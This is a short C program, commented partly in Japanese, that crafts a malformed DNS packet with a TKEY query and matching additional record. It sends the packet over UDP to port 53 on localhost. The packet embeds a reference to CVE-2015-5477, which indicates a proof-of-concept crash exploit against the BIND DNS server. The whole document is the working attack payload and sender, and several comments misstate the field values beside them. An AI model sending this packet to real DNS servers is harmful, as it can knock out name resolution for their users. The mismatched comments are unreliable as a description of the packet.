#include <sys/types.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
 
static const unsigned char versionpacket[] = {
        0x03, 0x04, /* ID */
        0x81, 0x80, /* FLAG 00000001, 00000000 */
        0x00, 0x01, /* QDCOUNT 1 One Question */
        0x00, 0x00, /* ANCOUNT 1 by Client */
        0x00, 0x00, /* NSCOUNT 0 by Client */
        0x00, 0x01, /* ARCOUNT 0 by Client */

        /* QUESTION SECTION */
        0x03, '1', 'm', 'g', 0x03, 'o', 'r', 'g', 0x00, /* QNAME */
        0x00, 249, /* QTYPE = 259(TKEY RR) */
        0x00, 255, /* QCLASS = 255(ANY) */

        /* Additional record  */
        0x03, '1', 'm', 'g', 0x03, 'o', 'r', 'g', 0x00, /* QNAME */
        0x00, 249, /* record type: must NOT be 249/TKEY */
        0x00, 254,
        0x00, 0x00, 0x00, 0x30,
        0x00, 51,
            50,
            'h', 't', 't', 'p', 's', ':', '/', '/', 
            'g', 'i', 't', 'h', 'u', 'b', '.', 'c', 
            'o', 'm', '/', 'r', 'o', 'b', 'e', 'r', 
            't', 'd', 'a', 'v', 'i', 'd', 'g', 'r', 
            'a', 'h', 'a', 'm', '/', 'c', 'v', 'e', 
            '-', '2', '0', '1', '5', '-', '5', '4', 
            '7', '7'
};

int main(int argc, char** argv)
{
    int sd;
    struct sockaddr_in addr;
    char senderstr[16];

    if((sd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("socket");
        return -1;
    }
 
    // 送信先アドレスとポート番号を設定する
    // 受信プログラムと異なるあて先を設定しても UDP の場合はエラーにはならない
    addr.sin_family = AF_INET;
    addr.sin_port = htons(53);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
 
    // パケットをUDPで送信
    unsigned int pack_size = sizeof(versionpacket);
    printf("send packet size = %d\n", pack_size);
    /* 送信元に関する情報を表示 */

    if(sendto(sd, (const char*)versionpacket, sizeof(versionpacket), 0,
              (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("sendto");
        return -1;
    }
    inet_ntop(AF_INET, &addr.sin_addr, senderstr, sizeof(senderstr));
    printf("CLIENT: recvfrom : %s, port=%d\n", senderstr, ntohs(addr.sin_port));
 
    close(sd);
 
    return 0;
}
